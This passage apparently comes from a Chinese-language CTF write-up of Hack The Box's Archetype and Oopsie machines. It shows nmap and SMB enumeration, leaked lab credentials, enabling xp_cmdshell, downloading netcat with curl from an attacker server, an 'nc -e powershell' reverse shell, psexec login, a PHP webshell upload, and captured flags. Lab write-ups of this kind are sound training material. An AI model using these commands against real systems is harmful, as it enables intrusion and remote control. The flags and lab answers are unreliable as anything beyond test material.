class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs cmd">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# nmap -sC -sV <span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">215</span>.<span class="hljs-number">139</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span> <span class="hljs-number">16</span>:<span class="hljs-number">52</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">215</span>.<span class="hljs-number">139</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">48</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">996</span> closed tcp ports (reset)<br>PORT     STATE SERVICE      VERSION<br><span class="hljs-number">135</span>/tcp  open  msrpc        Microsoft Windows RPC<br><span class="hljs-number">139</span>/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn<br><span class="hljs-number">445</span>/tcp  open  microsoft-ds Windows Server <span class="hljs-number">2019</span> Standard <span class="hljs-number">17763</span> microsoft-ds<br><span class="hljs-number">1433</span>/tcp open       Microsoft SQL Server <span class="hljs-number">2017</span> <span class="hljs-number">14</span>.<span class="hljs-number">00</span>.<span class="hljs-number">1000</span>.<span class="hljs-number">00</span>; RTM<br>| ms-sql-info:<br>|   <span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">215</span>.<span class="hljs-number">139</span>:<span class="hljs-number">1433</span>:<br>|     Version:<br>|       name: Microsoft SQL Server <span class="hljs-number">2017</span> RTM<br>|       number: <span class="hljs-number">14</span>.<span class="hljs-number">00</span>.<span class="hljs-number">1000</span>.<span class="hljs-number">00</span><br>|       Product: Microsoft SQL Server <span class="hljs-number">2017</span><br>|       Service pack level: RTM<br>|       Post-SP patches applied: false<br>|_    TCP port: <span class="hljs-number">1433</span><br>|_ssl-<span class="hljs-built_in">date</span>: <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span>T08:<span class="hljs-number">53</span>:<span class="hljs-number">01</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; +<span class="hljs-number">2</span>s from scanner <span class="hljs-built_in">time</span>.<br>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback<br>| <span class="hljs-keyword">Not</span> valid before: <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span>T08:<span class="hljs-number">44</span>:<span class="hljs-number">06</span><br>|_Not valid after:  <span class="hljs-number">2055</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span>T08:<span class="hljs-number">44</span>:<span class="hljs-number">06</span><br>| ms-sql-ntlm-info:<br>|   <span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">215</span>.<span class="hljs-number">139</span>:<span class="hljs-number">1433</span>:<br>|     Target_Name: ARCHETYPE<br>|     NetBIOS_Domain_Name: ARCHETYPE<br>|     NetBIOS_Computer_Name: ARCHETYPE<br>|     DNS_Domain_Name: Archetype<br>|     DNS_Computer_Name: Archetype<br>|_    Product_Version: <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">17763</span><br>Service Info: OSs: Windows, Windows Server <span class="hljs-number">2008</span> R2 - <span class="hljs-number">2012</span>; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb-os-discovery:<br>|   OS: Windows Server <span class="hljs-number">2019</span> Standard <span class="hljs-number">17763</span> (Windows Server <span class="hljs-number">2019</span> Standard <span class="hljs-number">6</span>.<span class="hljs-number">3</span>)<br>|   Computer name: Archetype<br>|   NetBIOS computer name: ARCHETYPE\x00<br>|   Workgroup: WORKGROUP\x00<br>|_  System <span class="hljs-built_in">time</span>: <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span>T00:<span class="hljs-number">52</span>:<span class="hljs-number">45</span>-<span class="hljs-number">08</span>:<span class="hljs-number">00</span><br>|_clock-skew: mean: <span class="hljs-number">1</span>h36m02s, deviation: <span class="hljs-number">3</span>h34m41s, median: <span class="hljs-number">1</span>s<br>| smb2-<span class="hljs-built_in">time</span>:<br>|   <span class="hljs-built_in">date</span>: <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span>T08:<span class="hljs-number">52</span>:<span class="hljs-number">46</span><br>|_  start_date: N/A<br>| smb2-security-<span class="hljs-built_in">mode</span>:<br>|   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>:<br>|_    Message signing enabled but <span class="hljs-keyword">not</span> required<br>| smb-security-<span class="hljs-built_in">mode</span>:<br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br><br>Service detection performed. Please report any incorrect results <span class="hljs-built_in">at</span> https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">33</span>.<span class="hljs-number">51</span> seconds<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Which TCP port <span class="hljs-keyword">is</span> hosting a <span class="hljs-keyword">database</span> <span class="hljs-keyword">server</span>?<br>:<span class="hljs-number">1433</span><br></code></pre></td></tr></table></figure><h3 id="Task-2-5"><a href="#Task-2-5" class="headerlink" title="Task 2"></a>Task 2</h3><p>关于 SMB（服务器消息块）服务器是一种网络协议，允许设备通过网络共享文件、打印机和其他资源，通过网络促进客户端和服务器之间的通信，可以通过 <code>smbclient</code> 连接</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# smbclient -N -L \\\\<span class="hljs-number">10.129</span><span class="hljs-number">.215</span><span class="hljs-number">.139</span>\\<br><br>        Sharename       <span class="hljs-keyword">Type</span>      <span class="hljs-keyword">Comment</span><br>        <span class="hljs-comment">---------       ----      -------</span><br>        <span class="hljs-keyword">ADMIN</span>$          Disk      Remote <span class="hljs-keyword">Admin</span><br>        backups         Disk<br>        C$              Disk      <span class="hljs-keyword">Default</span> <span class="hljs-keyword">share</span><br>        IPC$            IPC       Remote IPC<br>Reconnecting <span class="hljs-keyword">with</span> SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">to</span> <span class="hljs-number">10.129</span><span class="hljs-number">.215</span><span class="hljs-number">.139</span> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">connect</span> <span class="hljs-keyword">with</span> SMB1 <span class="hljs-comment">-- no workgroup available</span><br></code></pre></td></tr></table></figure><p>通过 IP 使用 <code>-N</code> 无密码连接，查看</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-type">name</span> <span class="hljs-keyword">of</span> the non-Administrative <span class="hljs-keyword">share</span> available <span class="hljs-keyword">over</span> SMB?<br>:backups  <br></code></pre></td></tr></table></figure><h3 id="Task-3-5"><a href="#Task-3-5" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tap">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─<span class="hljs-comment"># smbclient -N \\\\10.129.215.139\\backups</span><br>Try &quot;help&quot; to get a list of possible commands.<br>smb: \&gt; dir<br>  .                                   D       <span class="hljs-number"> 0 </span> Mon Jan<span class="hljs-number"> 20 </span>20:20:57 2020<br>  ..                                  D       <span class="hljs-number"> 0 </span> Mon Jan<span class="hljs-number"> 20 </span>20:20:57 2020<br>  prod.dtsConfig                     AR     <span class="hljs-number"> 609 </span> Mon Jan<span class="hljs-number"> 20 </span>20:23:02 2020<br><br>               <span class="hljs-number"> 5056511 </span>blocks of size 4096.<span class="hljs-number"> 2618271 </span>blocks available<br>smb: \&gt; get prod.dtsConfig<br>getting file \prod.dtsConfig of size<span class="hljs-number"> 609 </span>as prod.dtsConfig (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)<br>smb: \&gt; ^Z<br>[3]+  Stopped                 smbclient -N \\\\10.129.215.139\\backups<br></code></pre></td></tr></table></figure><p>把配置文件 <code>prod.dtsConfig</code> 下载下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mssql">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# cat prod.dtsConfig<br>&lt;DTSConfiguration&gt;<br>    &lt;DTSConfigurationHeading&gt;<br>        &lt;DTSConfigurationFileInfo GeneratedBy=&quot;...&quot; GeneratedFromPackageName=&quot;...&quot; GeneratedFromPackageID=&quot;...&quot; GeneratedDate=&quot;20.1.2019 10:01:34&quot;/&gt;<br>    &lt;/DTSConfigurationHeading&gt;<br>    &lt;Configuration ConfiguredType=&quot;Property&quot; Path=&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType=&quot;String&quot;&gt;<br>        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYP<br>        E\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;<br>    &lt;/Configuration&gt;<br>&lt;/DTSConfiguration&gt;<br></code></pre></td></tr></table></figure><p><code>Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc</code></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> password identified <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">on</span> <span class="hljs-title">the</span> <span class="hljs-title">SMB</span> <span class="hljs-title">share</span>?<br>:M3g4c0rp123<br></code></pre></td></tr></table></figure><h3 id="Task-4-5"><a href="#Task-4-5" class="headerlink" title="Task 4"></a>Task 4</h3><p><a href="https://github.com/fortra/impacket">impacket</a></p><p>进入 <code>impacket/examples/</code> 执行</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> mssqlclient.py sql_svc@<span class="hljs-number">10.129.215.139</span> -windows-auth<br></code></pre></td></tr></table></figure><p>不知道为什么，我的只能执行用户 ID 为 <code>sql_svc</code>，而不是 <code>ARCHETYPE\sql_svc</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What script <span class="hljs-keyword">from</span> Impacket collection can be used <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> establish an authenticated <span class="hljs-keyword">connection</span> <span class="hljs-keyword">to</span> a Microsoft <span class="hljs-keyword">SQL</span> <span class="hljs-keyword">Server</span>?<br>:mssqlclient.py<br></code></pre></td></tr></table></figure><h3 id="Task-5-5"><a href="#Task-5-5" class="headerlink" title="Task 5"></a>Task 5</h3><p><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">SELECT is_srvrolemember(‘sysadmin’);<br></code></pre></td></tr></table></figure><p>检查是否有权限，返回 1 就是有</p><p><a href="https://learn.microsoft.com/zh-cn/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16">xp_cmdshell</a></p><p><code>SQL SERVER</code> 有一个 <code>xp_shell</code> 的扩展存储过程可以生成 <code>windows shell</code>，<code>xp_cmdshell</code> 是一个 SQL Server 的扩展存储过程，它允许执行操作系统命令。在默认情况下,<code>xp_cmdshell</code> 可能在 <code>SQL Server</code> 上被禁用，需要先启用它</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>RECONFIGURE<span class="hljs-comment">;</span><br><span class="hljs-meta">#启动 p_cmdshell</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>RECONFIGURE<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs delphi">What extended <span class="hljs-keyword">stored</span> <span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">of</span> <span class="hljs-title">Microsoft</span> <span class="hljs-title">SQL</span> <span class="hljs-title">Server</span> <span class="hljs-title">can</span> <span class="hljs-title">be</span> <span class="hljs-title">used</span> <span class="hljs-title">in</span> <span class="hljs-title">order</span> <span class="hljs-title">to</span> <span class="hljs-title">spawn</span> <span class="hljs-title">a</span> <span class="hljs-title">Windows</span> <span class="hljs-title">command</span> <span class="hljs-title">shell</span>?</span><br><span class="hljs-function">:</span>xp_xmdshell<br></code></pre></td></tr></table></figure><h3 id="Task-6-5"><a href="#Task-6-5" class="headerlink" title="Task 6"></a>Task 6</h3><p>Windows 提权工具 <a href="https://github.com/peass-ng/PEASS-ng">winpeas</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What script can be used <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">search</span> possible paths <span class="hljs-keyword">to</span> escalate <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">on</span> Windows hosts?<br>:winpeas<br></code></pre></td></tr></table></figure><h3 id="Task-7-5"><a href="#Task-7-5" class="headerlink" title="Task 7"></a>Task 7</h3><p>我先上传了 nc ，然后连上了靶机，所以就直接在里面 wget 了</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">wget</span> http://10.10.16.31:8000/winPEASx64.exe -o winPEASx64.exe<br></code></pre></td></tr></table></figure><p>然后直接运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./winPEASx64.exe<br></code></pre></td></tr></table></figure><p>查看 <code>Powershell Settings</code> 这里的数据</p><p><img src="https://img.dkdun.cn/v1/2025/12/67eac352d7891d86.png"></p><p>查看 ps 的历史记录</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-built_in">type</span> <span class="hljs-name">C</span>:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br></code></pre></td></tr></table></figure><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">PS <span class="hljs-name">C</span>:\users\sql_svc&gt; <span class="hljs-built_in">type</span> <span class="hljs-name">C</span>:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br><span class="hljs-built_in">type</span> <span class="hljs-name">C</span>:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br>net.exe use <span class="hljs-name">T</span>: \\Archetype\backups /<span class="hljs-name">user</span>:administrator MEGACORP_4dm1n!!<br>exit<br></code></pre></td></tr></table></figure><p>拿到密码：MEGACORP_4dm1n!!</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-built_in">file</span> <span class="hljs-keyword">contains</span> <span class="hljs-keyword">the</span> administrator&#x27;s password?<br>:ConsoleHost_history.txt<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-5"><a href="#Submit-Flag-5" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>wsl 另外起一个 http 服务，目录下要存在 <code>nc64.exe</code> ，用于上传到靶机</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">python3 -m http.<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p>然后再执行</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">EXEC xp_cmdshell &#x27;curl -o C:\Users\sql_svc\nc.exe http://10.10.16.31:<span class="hljs-number">8000</span>/nc64.exe&#x27;<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c2a56c6e6ffa3068.png"></p><p>太不容易了，终于传上去了</p><p>然后执行，反弹 shell </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">EXEC xp_cmdshell &#x27;C:\Users\sql_svc\nc 10.10.16.31 <span class="hljs-number">1234</span> -e powershell&#x27;<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure><p>监听得到</p><p><img src="https://img.dkdun.cn/v1/2025/12/8d1eb2bd3bb6bb97.png"></p><p>进入 <code>sql_svc</code> 用户得到 userflag</p><p><img src="https://img.dkdun.cn/v1/2025/12/70e4a24ff74565c8.png"></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Submit <span class="hljs-keyword">user</span> <span class="hljs-title">flag</span><br>:<span class="hljs-number">3</span>e7b102e78218e935bf3f4951fec21a3<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-6"><a href="#Submit-Flag-6" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>根据之前找到的用户和密码</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">administrator:MEGACORP_4dm1n!!<br></code></pre></td></tr></table></figure><p>用 <code>psexec</code> 进行连接</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> psexec.py ARCHETYPE/administrator@<span class="hljs-number">10.129.50.161</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/55892af842e8dc23.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:b91ccec3305e98240082d4474b848528<br></code></pre></td></tr></table></figure><h2 id="Oopsie"><a href="#Oopsie" class="headerlink" title="Oopsie"></a>Oopsie</h2><h3 id="Task-1-6"><a href="#Task-1-6" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">With</span> what kind <span class="hljs-keyword">of</span> tool can intercept web traffic?<br>:proxy<br></code></pre></td></tr></table></figure><h3 id="Task-2-6"><a href="#Task-2-6" class="headerlink" title="Task 2"></a>Task 2</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# nmap -sS -sC -Pn <span class="hljs-number">10.129.191.100</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2025-03-04</span> <span class="hljs-number">21</span>:<span class="hljs-number">43</span> CST<br>Nmap scan report for <span class="hljs-number">10.129.191.100</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">49</span>s latency).<br>Not shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp open  ssh<br>| ssh-hostkey:<br>|   <span class="hljs-number">2048</span> <span class="hljs-number">61:e4:3f:d4:1e:e2:b2:f1</span>:<span class="hljs-number">0d:3c:ed:36:28:36:67:c7</span> (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">24:1d:a4:17:d4:e3:2a:9c</span>:<span class="hljs-number">90:5c:30:58:8f:60:77:8d</span> (ECDSA)<br>|_  <span class="hljs-number">256 78:03</span>:<span class="hljs-number">0e:b4:a1:af:e5:c2:f9:8d</span>:<span class="hljs-number">29</span>:<span class="hljs-number">05</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">29</span>:c9:f2 (ED25519)<br><span class="hljs-number">80</span>/tcp open  http<br></code></pre></td></tr></table></figure><p>开了 22 和 80，访问 80</p><p><img src="https://img.dkdun.cn/v1/2025/12/bc6c06a64e4fb429.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-type">path</span> <span class="hljs-keyword">to</span> the directory <span class="hljs-keyword">on</span> the webserver that <span class="hljs-keyword">returns</span> a <span class="hljs-keyword">login</span> page?<br>:/cdn-cgi/<span class="hljs-keyword">login</span><br></code></pre></td></tr></table></figure><h3 id="Task-3-6"><a href="#Task-3-6" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What can be modified <span class="hljs-keyword">in</span> Firefox <span class="hljs-built_in">to</span> <span class="hljs-built_in">get</span> access <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> upload page?<br>:cookie<br></code></pre></td></tr></table></figure><h3 id="Task-4-6"><a href="#Task-4-6" class="headerlink" title="Task 4"></a>Task 4</h3><p>id&#x3D;1 时为 admin</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">10.129.191.100</span>/cdn-cgi/login/admin.php?content=accounts&amp;id=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c877c650ccae7bc1.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">access</span> ID <span class="hljs-keyword">of</span> the <span class="hljs-keyword">admin</span> <span class="hljs-keyword">user</span>?<br>:<span class="hljs-number">34322</span><br></code></pre></td></tr></table></figure><h3 id="Task-5-6"><a href="#Task-5-6" class="headerlink" title="Task 5"></a>Task 5</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">On uploading a <span class="hljs-built_in">file</span>, what directory <span class="hljs-keyword">does</span> <span class="hljs-keyword">that</span> <span class="hljs-built_in">file</span> appear <span class="hljs-keyword">in</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> server?<br>:/uploads<br></code></pre></td></tr></table></figure><h3 id="Task-6-6"><a href="#Task-6-6" class="headerlink" title="Task 6"></a>Task 6</h3><p><img src="https://img.dkdun.cn/v1/2025/12/bb602b9c50217e2d.png"></p><p>在 uploads 上传一个一句话木马，蚁剑连接，<code>/var/www/html/cdn-cgi/login/</code> 路径下找到</p><p>db.php 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;robert&#x27;</span>,<span class="hljs-string">&#x27;M3g4C0rpUs3r!&#x27;</span>,<span class="hljs-string">&#x27;garage&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">that</span> <span class="hljs-keyword">contains</span> <span class="hljs-keyword">the</span> password <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> shared <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> robert user?<br>:db.php<br></code></pre></td></tr></table></figure><h3 id="Task-7-6"><a href="#Task-7-6" class="headerlink" title="Task 7"></a>Task 7</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What executible <span class="hljs-keyword">is</span> run <span class="hljs-keyword">with</span> the <span class="hljs-keyword">option</span> &quot;-group bugtracker&quot; <span class="hljs-keyword">to</span> identify <span class="hljs-keyword">all</span> files <span class="hljs-keyword">owned</span> <span class="hljs-keyword">by</span> the bugtracker <span class="hljs-keyword">group</span>?<br>:find<br></code></pre></td></tr></table></figure><h3 id="Task-8-4"><a href="#Task-8-4" class="headerlink" title="Task 8"></a>Task 8</h3><p>传上去的文件几分钟就被删了，有定时任务，弹个 shell，用 kali 自带的 webshell，<code>/usr/share/webshells/php</code> 下的 <code>php-reverse-shell.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 